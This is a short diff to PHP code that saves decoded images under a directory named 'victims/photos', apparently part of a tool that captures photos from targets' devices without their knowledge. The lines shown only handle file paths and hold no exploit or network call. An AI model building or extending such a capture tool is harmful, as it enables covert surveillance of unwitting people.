@@ -16,7 +16,7 @@
     error_log("Decoded image size: " . strlen($imageData) . " bytes");
 
     $filename = 'photo_' . time() . '.png';
-    $photosDir = "./victims" . '/' . 'photos';
+    $photosDir = "./catches/victims" . '/' . 'photos';
     $filePath = $photosDir . '/' . $filename;
 
     if (!file_exists($photosDir)) {
